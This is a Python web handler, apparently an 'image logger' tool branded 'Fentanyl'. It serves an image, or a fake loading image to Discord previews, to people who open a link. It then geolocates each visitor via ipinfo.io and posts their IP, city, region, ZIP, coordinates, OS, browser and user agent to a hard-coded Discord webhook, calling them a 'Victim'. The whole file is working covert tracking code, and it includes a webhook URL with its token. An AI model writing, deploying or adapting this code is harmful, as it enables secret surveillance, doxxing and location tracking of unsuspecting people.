from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests, base64, httpagentparser

webhook = 'https://discord.com/api/webhooks/1066988742696513606/jcW2Rm6Su4y3HetnOaYCHwU6Q3BBtQj8n4MSAsKWnQKn2wXV7gqTYQvQ0uElN5k9jDsf'
bindata = requests.get('https://scontent.ftun6-1.fna.fbcdn.net/v/t39.30808-6/325989032_1286493291983311_2061836158050289809_n.jpg?_nc_cat=104&ccb=1-7&_nc_sid=730e14&_nc_ohc=XFFQ9Vpp7bIAX_qfDOE&_nc_ht=scontent.ftun6-1.fna&oh=00_AfDBLZ1zesppCSd9rCvNhb2iYmk_lbH2q-mOeN0WQ7N-Dw&oe=63D32D41').content

buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
  "username": "Fentanyl",
  "content": "@everyone",
  "embeds": [
    {
      "title": "Fentanyl strikes again!",
      "color": 16711803,
      "description": "A Victim opened the original Image. You can find their info below.",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
        {
          "name": "IP Info",
          "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
          "inline": True
        },
        {
          "name": "Advanced Info",
          "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```",
          "inline": False
        }
      ]
    }
  ],
}

def prev(ip,uag):
  return {
  "username": "Fentanyl",
  "content": "",
  "embeds": [
    {
      "title": "Fentanyl Alert!",
      "color": 16711803,
      "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
      "author": {
        "name": "Fentanyl"
      },
      "fields": [
      ]
    }
  ],
}


# This long bit of Base85 encoded Binary is an image with no actual content, which creates a loading image on discord.
# It's not malware, if you don't trust it read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious
# I've already disproved every single one. You aren't helping.
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        try: data = requests.get(dic['url']).content if 'url' in dic else bindata
        except Exception: data = bindata
        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        if self.headers.get('x-forwarded-for').startswith(('35','34','104.196')):
            if 'discord' in useragent.lower(): self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(buggedbin if buggedimg else bindata); requests.post(webhook,json=prev(self.headers.get('x-forwarded-for'),useragent))
            else: pass
        else: self.send_response(200); self.send_header('Content-type','image/jpeg'); self.end_headers(); self.wfile.write(data); ipInfo = requests.get('https://ipinfo.io/{}/json'.format(self.headers.get('x-forwarded-for'))).json(); requests.post(webhook,json=formatHook(ipInfo['ip'],ipInfo['city'],ipInfo['region'],ipInfo['country'],ipInfo['loc'],ipInfo['org'],ipInfo['postal'],useragent,os,browser))
        return
